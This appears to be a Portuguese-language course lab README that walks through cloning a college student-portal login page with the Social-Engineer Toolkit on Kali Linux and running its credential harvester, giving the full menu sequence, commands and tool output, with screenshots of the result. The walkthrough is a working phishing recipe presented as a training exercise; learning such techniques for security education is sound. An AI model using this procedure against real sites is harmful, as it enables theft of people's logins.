# Phishing para captura de senhas 🚩

Fazer a captura de usuário e senha de um site usando ferramentas do kali Linux

## Ferramentas 👨‍💻

- Kali Linux
- setoolkit

## Passo a Passo 👣


• Acesso root: sudo su

• Iniciando o setoolkit: setoolkit

                                                                   
 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 


• Tipo de ataque: Social-Engineering Attacks

set> 1

 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 


• Vetor de ataque: Web Site Attack Vectors

set> 2


   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>


• Método de ataque: Credential Harvester Attack Method 

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>


• Método de ataque: Site Cloner

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report



set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.0.191]: 
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com


• Obtendo o endereço da máquina: ifconfig
• URL para clone: http://www.exemplofaculdade.com


set:webattack> Enter the url to clone: http://www.exemplofaculdade.com

[*] Cloning the website: https://login.exemplofaculdade.com/login.php                                  
[*] This could take a little bit...                                                            

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                      
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                 
[*] Information will be displayed to you as it arrives below:          

## Resultados 🎁

![Alt text](./results1.PNG)

Figura 1: Site de uma faculdade para o portal do aluno

![Alt text](./results2.PNG)

Figura 2: Imagem do Kali Linux usando a ferramenta SETOOLKIT

## Referências 📚

- https://web.dio.me/track/santander-ciberseguranca-2024
- https://www.kali.org/

## Updates 🕐

2024/12/10 - Primeira versão

## Pendências 🚨

